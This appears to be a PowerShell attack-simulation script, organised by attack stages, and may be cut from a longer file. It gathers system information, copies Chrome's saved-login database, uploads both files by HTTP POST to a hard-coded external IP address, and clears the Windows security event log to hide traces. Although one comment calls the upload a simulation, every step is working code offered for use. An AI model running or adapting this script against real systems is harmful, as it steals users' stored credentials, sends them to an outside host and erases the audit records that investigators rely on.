# 2. Discovery - Gather system information (Whoami + ipconfig)
$discoveryResults = @()
$discoveryResults += "Whoami: $(whoami)"
$discoveryResults += "IP Configuration: $(ipconfig)"
$discoveryResults | Out-File -FilePath "$env:USERPROFILE\Downloads\discovery_results.txt"

# 3. Execution - Dump Chrome credentials to a file
$chromeCredentials = (Get-Content "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data" -ErrorAction SilentlyContinue) -join "`r`n"
$chromeCredentials | Out-File -FilePath "$env:USERPROFILE\Downloads\chrome_credentials.txt"

# 4. Exfiltration - Simulate sending to a remote server (replace 'RemoteServer' with the actual server details)
$remoteServer = "https://53.25.113.140/RemoteServer/upload"
Invoke-RestMethod -Uri $remoteServer -Method Post -InFile "$env:USERPROFILE\Downloads\discovery_results.txt"
Invoke-RestMethod -Uri $remoteServer -Method Post -InFile "$env:USERPROFILE\Downloads\chrome_credentials.txt"

# 5. Impact - Clear event logs
wevtutil clear-log security
